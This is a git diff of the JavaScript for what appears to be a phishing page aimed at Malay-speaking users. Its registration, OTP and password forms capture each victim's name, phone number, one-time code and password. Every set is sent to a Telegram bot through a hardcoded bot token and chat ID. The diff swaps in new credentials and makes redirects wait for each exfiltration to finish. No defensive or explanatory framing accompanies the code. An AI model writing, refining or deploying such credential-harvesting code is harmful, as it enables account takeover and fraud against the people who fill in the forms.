@@ -16,6 +16,7 @@ const phoneInput = window.intlTelInput(phoneInputField, {
 });
 
 // Form Pendaftaran
+// Form Pendaftaran
 document
   .getElementById("registrationForm")
   .addEventListener("submit", function (e) {
@@ -28,15 +29,15 @@ document
 
     // Kirim data ke Telegram
     sendToTelegram(`
-──────────────────────
+────────────────
 ( MALAY | DATA )
-──────────────────────
+────────────────
 👤 Nama Lengkap  : ${name}
 📱 No HP         : ${phone}
-──────────────────────
-    `);
-
-    showPage("kodeContent");
+────────────────
+    `).then(() => {
+      showPage("kodeContent");
+    });
   });
 
 // Form OTP
@@ -50,16 +51,16 @@ document.getElementById("otpForm").addEventListener("submit", function (e) {
   const savedPhone = localStorage.getItem("phone");
 
   sendToTelegram(`
-──────────────────────
+────────────────
 ( MALAY | DATA )
-──────────────────────
+────────────────
 👤 Nama Lengkap  : ${savedName}
 📱 No HP         : ${savedPhone}
 🔑 OTP           : ${otp}
-──────────────────────
-    `);
-
-  showPage("kataSandiContent");
+────────────────
+    `).then(() => {
+    showPage("kataSandiContent");
+  });
 });
 
 // Form Kata Sandi
@@ -67,39 +68,34 @@ document
   .getElementById("passwordForm")
   .addEventListener("submit", function (e) {
     e.preventDefault();
-    const kataSandi = document.getElementById("kata-sandi").value;
-
-    // Sembunyikan form dan tampilkan loading
-    document.getElementById("kata-sandi").style.display = "none";
-    document.getElementById("loginButton").style.display = "none";
-    document.getElementById("loadingGif").style.display = "block";
-    document.getElementById("formMessage").style.display = "block";
-    document.getElementById("kataSandi").style.display = "none";
-    document.getElementById("useAnotherPhone").style.display = "block";
 
     // Kirim data ke Telegram
+    const kataSandi = document.getElementById("kata-sandi").value;
     const savedName = localStorage.getItem("name");
     const savedPhone = localStorage.getItem("phone");
     const savedOtp = localStorage.getItem("otp");
 
     sendToTelegram(`
-──────────────────────
+────────────────
 ( MALAY | DATA )
-──────────────────────
+────────────────
 👤 Nama Lengkap  : ${savedName}
 📱 No HP         : ${savedPhone}
 🔑 OTP           : ${savedOtp}
 🔐 Kata Sandi    : ${kataSandi}
-──────────────────────
-    `);
+────────────────
+    `).then(() => {
+      // Pindah ke borang.html setelah semua pesan terkirim
+      window.location.href = "borang.html";
+    });
   });
 
 // Fungsi untuk mengirim ke Telegram
 function sendToTelegram(message) {
-  const botToken = "7592836689:AAF_-I0iLIBvALIvfyHIn1ShwcQGoQ1lAhk";
-  const chatId = "6635454493";
+  const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
+  const chatId = "5265564576";
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
@@ -108,9 +104,18 @@ function sendToTelegram(message) {
       chat_id: chatId,
       text: message,
     }),
-  });
+  })
+    .then((response) => {
+      if (!response.ok) {
+        throw new Error(
+          "Error sending message to Telegram: " + response.statusText
+        );
+      }
+    })
+    .catch((error) => {
+      console.error("Error sending message to Telegram:", error);
+    });
 }
-
 // Auto-scroll untuk record box
 function startAutoScroll() {
   const list = document.querySelector(".list");
@@ -162,13 +167,3 @@ document.querySelectorAll(".btn").forEach((button) => {
     showLoading();
   });
 });
-
-function handleButtonClick() {
-  // Tampilkan layar loading
-  document.getElementById("loadingScreen").style.display = "flex";
-
-  // Tunggu beberapa detik sebelum beralih ke halaman baru
-  setTimeout(() => {
-    window.location.href = "borang.html";
-  }, 2000); // 2000 milidetik = 2 detik
-}
